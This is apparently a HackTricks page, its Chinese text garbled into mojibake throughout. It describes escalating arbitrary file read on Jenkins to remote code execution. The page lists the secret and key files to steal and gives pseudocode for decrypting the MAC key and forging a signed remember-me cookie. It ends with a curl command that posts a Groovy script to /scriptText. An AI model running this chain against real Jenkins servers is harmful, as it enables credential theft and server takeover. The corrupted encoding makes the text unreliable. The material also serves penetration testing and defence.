# Jenkins Arbitrary File Read to RCE via "Remember Me"

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

åœ¨è¿™ç¯‡åšå®¢æ–‡ç« ä¸­ï¼Œå¯ä»¥æ‰¾åˆ°å°† Jenkins ä¸­çš„æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´è½¬åŒ–ä¸º RCE çš„ç»ä½³æ–¹æ³•ï¼š[https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/](https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/)

è¿™æ˜¯ä¸€ä¸ª AI åˆ›å»ºçš„æ‘˜è¦ï¼Œå†…å®¹æ¶‰åŠå¦‚ä½•åˆ©ç”¨ä»»æ„ cookie æ¥è·å– RCEï¼Œç›´åˆ°æˆ‘æœ‰æ—¶é—´è‡ªå·±åˆ›å»ºæ‘˜è¦ä¸ºæ­¢ï¼š

### æ”»å‡»å‰æ

* **åŠŸèƒ½è¦æ±‚ï¼š** å¿…é¡»å¯ç”¨â€œè®°ä½æˆ‘â€ï¼ˆé»˜è®¤è®¾ç½®ï¼‰ã€‚
* **è®¿é—®çº§åˆ«ï¼š** æ”»å‡»è€…éœ€è¦æ•´ä½“/è¯»å–æƒé™ã€‚
* **ç§˜å¯†è®¿é—®ï¼š** èƒ½å¤Ÿè¯»å–å…³é”®æ–‡ä»¶ä¸­çš„äºŒè¿›åˆ¶å’Œæ–‡æœ¬å†…å®¹ã€‚

### è¯¦ç»†åˆ©ç”¨è¿‡ç¨‹

#### ç¬¬ä¸€æ­¥ï¼šæ•°æ®æ”¶é›†

**ç”¨æˆ·ä¿¡æ¯æ£€ç´¢**

* è®¿é—®æ¯ä¸ªç”¨æˆ·çš„ç”¨æˆ·é…ç½®å’Œç§˜å¯†ï¼Œä½äº `$JENKINS_HOME/users/*.xml`ï¼Œä»¥æ”¶é›†ï¼š
* **ç”¨æˆ·å**
* **ç”¨æˆ·ç§å­**
* **æ—¶é—´æˆ³**
* **å¯†ç å“ˆå¸Œ**

**å¯†é’¥æå–**

* æå–ç”¨äºç­¾ç½² cookie çš„åŠ å¯†å¯†é’¥ï¼š
* **ç§˜å¯†å¯†é’¥ï¼š** `$JENKINS_HOME/secret.key`
* **ä¸»å¯†é’¥ï¼š** `$JENKINS_HOME/secrets/master.key`
* **MAC å¯†é’¥æ–‡ä»¶ï¼š** `$JENKINS_HOME/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac`

#### ç¬¬äºŒæ­¥ï¼šCookie ä¼ªé€ 

**ä»¤ç‰Œå‡†å¤‡**

*   **è®¡ç®—ä»¤ç‰Œè¿‡æœŸæ—¶é—´ï¼š**

{% code overflow="wrap" %}
```javascript
tokenExpiryTime = currentServerTimeInMillis() + 3600000  // å½“å‰æ—¶é—´åŠ ä¸€å°æ—¶
```
{% endcode %}
*   **è¿æ¥ä»¤ç‰Œæ•°æ®ï¼š**

{% code overflow="wrap" %}
```javascript
token = username + ":" + tokenExpiryTime + ":" + userSeed + ":" + secretKey
```
{% endcode %}

**MAC å¯†é’¥è§£å¯†**

*   **è§£å¯† MAC å¯†é’¥æ–‡ä»¶ï¼š**

```javascript
key = toAes128Key(masterKey)  // å°†ä¸»å¯†é’¥è½¬æ¢ä¸º AES128 å¯†é’¥æ ¼å¼
decrypted = AES.decrypt(macFile, key)  // è§£å¯† .mac æ–‡ä»¶
if not decrypted.hasSuffix("::::MAGIC::::")
return ERROR;
macKey = decrypted.withoutSuffix("::::MAGIC::::")
```

**ç­¾åè®¡ç®—**

*   **è®¡ç®— HMAC SHA256ï¼š**

```javascript
mac = HmacSHA256(token, macKey)  // ä½¿ç”¨ä»¤ç‰Œå’Œ MAC å¯†é’¥è®¡ç®— HMAC
tokenSignature = bytesToHexString(mac)  // å°† MAC è½¬æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²
```

**Cookie ç¼–ç **

*   **ç”Ÿæˆæœ€ç»ˆ Cookieï¼š**

{% code overflow="wrap" %}
```javascript
cookie = base64.encode(username + ":" + tokenExpiryTime + ":" + tokenSignature)  // Base64 ç¼–ç  cookie æ•°æ®
```
{% endcode %}

#### ç¬¬ä¸‰æ­¥ï¼šä»£ç æ‰§è¡Œ

**ä¼šè¯è®¤è¯**

* **è·å– CSRF å’Œä¼šè¯ä»¤ç‰Œï¼š**
* å‘ `/crumbIssuer/api/json` å‘å‡ºè¯·æ±‚ä»¥è·å– `Jenkins-Crumb`ã€‚
* ä»å“åº”ä¸­æ•è· `JSESSIONID`ï¼Œè¯¥ ID å°†ä¸è®°ä½æˆ‘ cookie ä¸€èµ·ä½¿ç”¨ã€‚

**å‘½ä»¤æ‰§è¡Œè¯·æ±‚**

*   **å‘é€å¸¦æœ‰ Groovy è„šæœ¬çš„ POST è¯·æ±‚ï¼š**

```bash
curl -X POST "$JENKINS_URL/scriptText" \
--cookie "remember-me=$REMEMBER_ME_COOKIE; JSESSIONID...=$JSESSIONID" \
--header "Jenkins-Crumb: $CRUMB" \
--header "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "script=$SCRIPT"
```

* Groovy è„šæœ¬å¯ç”¨äºåœ¨ Jenkins ç¯å¢ƒä¸­æ‰§è¡Œç³»ç»Ÿçº§å‘½ä»¤æˆ–å…¶ä»–æ“ä½œã€‚

æä¾›çš„ç¤ºä¾‹ curl å‘½ä»¤æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨å¿…è¦çš„å¤´å’Œ cookie å‘ Jenkins å‘å‡ºè¯·æ±‚ï¼Œä»¥å®‰å…¨åœ°æ‰§è¡Œä»»æ„ä»£ç ã€‚

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
